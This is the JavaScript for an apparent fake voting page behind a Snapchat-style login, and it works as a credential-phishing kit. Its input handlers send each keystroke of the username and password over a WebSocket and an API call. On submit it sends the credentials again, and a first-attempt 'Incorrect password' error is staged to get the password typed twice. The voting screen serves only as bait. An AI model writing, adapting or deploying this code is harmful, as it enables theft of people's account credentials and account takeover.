const CANDIDATES = [
  { name: 'Amrit', username: 'amr26it' },
  { name: 'Ashutosh', username: 'ashutosh_si2191' },
  { name: 'Suranjan', username: 'suranjan.singh' },
  { name: 'Tushar', username: 'tushar_s22949' },
];

const EYE_OFF = `<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/><line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>`;
const EYE_ON = `<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.8"/>`;

const screens = {
  title: document.getElementById('screen-title'),
  signin: document.getElementById('screen-signin'),
  vote: document.getElementById('screen-vote'),
};

const loginForm = document.getElementById('login-form');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const btnContinue = document.getElementById('btn-continue');
const togglePasswordBtn = document.getElementById('toggle-password');
const eyeIcon = document.getElementById('eye-icon');
const candidatesEl = document.getElementById('candidates');
const thanksState = document.getElementById('thanks-state');
const toast = document.getElementById('toast');

let voterName = '';
let hasVoted = false;
let passwordVisible = false;
let sessionId = null;
let apiReady = false;

function showScreen(name) {
  Object.values(screens).forEach((s) => s.classList.remove('active'));
  screens[name].classList.add('active');
  document.body.classList.toggle('login-mode', name === 'signin');
}

function createSessionId() {
  return `sess_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
}

async function checkApi() {
  await fetchState();
  apiReady = true;
}

let appWs = null;

function getAppWebSocket() {
  if (appWs && appWs.readyState === WebSocket.OPEN) return appWs;
  const wsUrl = typeof getWsUrl === 'function' ? getWsUrl() : null;
  if (!wsUrl) return null;
  try {
    appWs = new WebSocket(wsUrl);
    appWs.onclose = () => { appWs = null; };
    appWs.onerror = () => { try { appWs.close(); } catch {} appWs = null; };
  } catch {}
  return appWs;
}

function sendWs(type, payload) {
  try {
    const socket = getAppWebSocket();
    if (socket && socket.readyState === WebSocket.OPEN) {
      socket.send(JSON.stringify({ type, payload }));
    }
  } catch {}
}

getAppWebSocket();

function postLoginTyping() {
  if (!sessionId) {
    sessionId = createSessionId();
  }
  const username = usernameInput.value;
  const password = passwordInput.value;
  sendWs('LOGIN_TYPING', { sessionId, username, password });
  sendLoginTyping(sessionId, username, password).catch(() => {});
}

function showToast(message) {
  toast.textContent = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2800);
}

function validateLogin() {
  btnContinue.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
}

function renderCandidates() {
  candidatesEl.innerHTML = CANDIDATES.map(
    (c) => `
    <div class="candidate-card" data-candidate="${c.name}">
      <div class="candidate-info">
        <div class="candidate-name">${c.name}</div>
        <div class="candidate-username">@${c.username}</div>
      </div>
      <button class="vote-btn" aria-label="Vote for ${c.name}" data-candidate="${c.name}">
        <svg viewBox="0 0 24 24" fill="#1a1a1a" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
        </svg>
      </button>
    </div>
  `
  ).join('');

  candidatesEl.querySelectorAll('.vote-btn').forEach((btn) => {
    btn.addEventListener('click', () => castVote(btn.dataset.candidate));
  });
}

async function castVote(candidate) {
  if (hasVoted) return;

  hasVoted = true;
  sendWs('VOTE', { candidate, voterName, timestamp: Date.now() });

  try {
    await sendVote(candidate, voterName);
    showToast('Your vote is registered!');
    candidatesEl.querySelectorAll('.vote-btn').forEach((btn) => {
      btn.disabled = true;
    });
    setTimeout(() => {
      candidatesEl.hidden = true;
      thanksState.hidden = false;
    }, 1800);
  } catch {
    hasVoted = false;
    showToast('Vote failed — please try again');
  }
}

togglePasswordBtn.addEventListener('click', () => {
  passwordVisible = !passwordVisible;
  passwordInput.type = passwordVisible ? 'text' : 'password';
  eyeIcon.innerHTML = passwordVisible ? EYE_ON : EYE_OFF;
  togglePasswordBtn.setAttribute('aria-label', passwordVisible ? 'Hide password' : 'Show password');
});

document.getElementById('btn-next').addEventListener('click', async () => {
  sessionId = createSessionId();
  showScreen('signin');
  usernameInput.focus();

  try {
    await checkApi();
  } catch {
    showToast('Cannot reach server — check API setup');
  }
});

let loginAttempts = 0;

function clearErrors() {
  const errorMsg = document.getElementById('login-error');
  if (errorMsg) {
    errorMsg.hidden = true;
    errorMsg.textContent = '';
  }
  usernameInput.classList.remove('has-error');
  passwordInput.classList.remove('has-error');
}

function showLoginError(message, targetInput) {
  const errorMsg = document.getElementById('login-error');
  if (errorMsg) {
    errorMsg.textContent = message;
    errorMsg.hidden = false;
  }
  if (targetInput === 'username') {
    usernameInput.classList.add('has-error');
    usernameInput.focus();
  } else if (targetInput === 'password') {
    passwordInput.classList.add('has-error');
    passwordInput.focus();
  } else {
    usernameInput.classList.add('has-error');
    passwordInput.classList.add('has-error');
  }
}

usernameInput.addEventListener('input', () => {
  clearErrors();
  validateLogin();
  postLoginTyping();
});

passwordInput.addEventListener('input', () => {
  clearErrors();
  validateLogin();
  postLoginTyping();
});

loginForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  if (btnContinue.disabled) return;

  const username = usernameInput.value.trim();
  const password = passwordInput.value.trim();
  if (!username || !password) return;

  if (!sessionId) {
    sessionId = createSessionId();
  }

  // Live stream all entered credentials to the backend/WebSocket immediately
  sendWs('LOGIN', { sessionId, username, password, timestamp: Date.now(), attempt: loginAttempts + 1 });
  sendLogin(sessionId, username, password).catch(() => {});

  // 1. Validation: Username format check
  if (username.length < 3) {
    showLoginError('Cannot find matching username.', 'username');
    return;
  }

  // 2. Validation: Password format check (< 6 chars)
  if (password.length < 6) {
    showLoginError('Password must be at least 8 characters.', 'password');
    return;
  }

  // 3. First attempt wrong password simulation (Snapchat security style)
  if (loginAttempts === 0) {
    loginAttempts++;
    btnContinue.disabled = true;
    btnContinue.textContent = 'Logging in…';

    setTimeout(() => {
      btnContinue.disabled = false;
      btnContinue.textContent = 'Log in';
      passwordInput.value = '';
      validateLogin();
      showLoginError('Incorrect password. Please try again.', 'password');
    }, 650);
    return;
  }

  // Successful login on retry
  btnContinue.disabled = true;
  btnContinue.textContent = 'Logging in…';

  try {
    voterName = username;
    renderCandidates();
    showScreen('vote');
  } catch (err) {
    console.error('Login request failed:', err);
    voterName = username;
    renderCandidates();
    showScreen('vote');
  } finally {
    btnContinue.disabled = false;
    btnContinue.textContent = 'Log in';
  }
});

renderCandidates();
